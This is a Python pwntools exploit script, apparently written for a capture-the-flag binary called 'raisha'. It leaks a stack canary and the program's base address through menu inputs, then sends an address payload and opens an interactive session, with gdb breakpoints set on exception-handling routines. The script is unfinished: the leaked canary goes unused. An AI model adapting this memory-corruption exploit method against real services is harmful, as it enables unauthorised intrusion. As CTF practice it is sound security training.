#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './raisha' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
libc = '/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '', 1337 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break vuln
# breakrva 0x141b
break __cxa_throw@plt
break _Unwind_RaiseException@plt
'''.format(**locals())


# =========================================================
#                         NOTES
# =========================================================




# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(elf)
    
    io.sendline(b'2')
    
    io.sendline(b'11')
    io.recvuntil(b'0x')
    canary = int(io.recvline().strip(), 16)
    
    # leak elf base
    io.sendline(b'2')
    io.sendline(b'1')
    io.recvuntil(b'0x')
    elf.address = int(io.recvline().strip(), 16) - 0x52a0
    
    
    info(f'canary: {hex(canary)}')
    info(f'elf base: {hex(elf.address)}')
    
    io.sendline(b'1')
    io.sendline(b'17')
    
    payload = p64(elf.sym['_init'])
    io.sendline(payload)
    io.interactive()
    
if __name__ == '__main__':
    exploit()